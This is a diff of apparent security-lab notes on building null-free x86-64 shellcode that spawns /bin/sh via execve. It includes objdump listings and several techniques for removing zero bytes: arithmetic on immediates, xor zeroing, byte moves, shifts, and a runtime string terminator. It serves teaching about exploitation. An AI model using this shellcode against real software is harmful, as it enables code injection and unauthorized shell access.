@@ -172,23 +172,20 @@
 
     0000000000000002 <one>:
     2:	5b                   	pop    rbx
-    3:	30 c0                	xor    al,al
-    5:	88 43 07             	mov    BYTE PTR [rbx+0x7],al
-    8:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
-    c:	b8 00 00 00 00       	mov    eax,0x0                  <--- zeros
-    11:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
-    15:	48 89 df             	mov    rdi,rbx
-    18:	48 8d 73 08          	lea    rsi,[rbx+0x8]
-    1c:	ba 00 00 00 00       	mov    edx,0x0                  <--- zeros
-    21:	b8 3b 00 00 00       	mov    eax,0x3b                 <--- zeros
-    26:	0f 05                	syscall 
+    3:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
+    7:	b8 00 00 00 00       	mov    eax,0x0                  <--- zeros
+    c:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
+    10:	48 89 df             	mov    rdi,rbx
+    13:	48 8d 73 08          	lea    rsi,[rbx+0x8]
+    17:	ba 00 00 00 00       	mov    edx,0x0                  <--- zeros
+    1c:	b8 3b 00 00 00       	mov    eax,0x3b                 <--- zeros
+    21:	0f 05                	syscall 
 
     0000000000000028 <two>:
-    28:	e8 d5 ff ff ff 2f 62 69 6e 2f 73 68 ff 41 41 41     ...../bin/sh.AAA
-    38:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
+    23:	e8 d5 ff ff ff 2f 62 69 6e 2f 73 68 00 41 41 41     ...../bin/sh.AAA  <-- zero
+    33:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
     ```
-- here are the assembly instructions that contains byte zero in the machine code
-, `59` (0x0000003b) contains byte zero
+- the assembly instructions that contains byte zero in the machine code are marked
     - note that in the machine code, it actually uses the registers `eax`, `edx`, the lower 32 bits of `rax`, `rdx`
 
 - rewrite `mysh64.s` to `no0_sh64.s`
@@ -206,6 +203,11 @@
         // mov rax, 59
         mov rax, 0x1111113c
         sub rax, 0x11111111
+        ```
+    - when terminating a string, there will also be `0x00`: `db '/bin/sh', 0x00`, we can set it `0xff` first, and before we use it, we dynamically set it to zero in the code, add two instructions to set a terminator for string `"/bin/sh"`
+        ```
+        xor al, al
+        mov [rdx+7], al; because '/bin/sh' takes 7 bytes
         ```
     - test whether the new code prompts a shell (it works)
         ```
@@ -249,3 +251,10 @@
         3b:	e8 c2 ff ff ff 2f 62 69 6e 2f 73 68 ff 41 41 41     ...../bin/sh.AAA
         4b:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
         ```
+    - there are also other way to eliminate zeros
+        1. to set `rax` to zero, we can instead use `xor rax, rax`
+        2. to set `rax` to `0x3b` (`59`), we can first `xor rax, rax`, then `mov al, 0x3b`, `al` is the least significant byte of `rax`
+        3. we can also use shift, `shl` and `shr`
+            1. `mov rax, 0xffffffffffffff3b`
+            2. `shl rax, 56` ---> `rax`: `0x3b00000000000000`
+            3. `shr rax, 56` ---> `rax`: `0x000000000000003b`
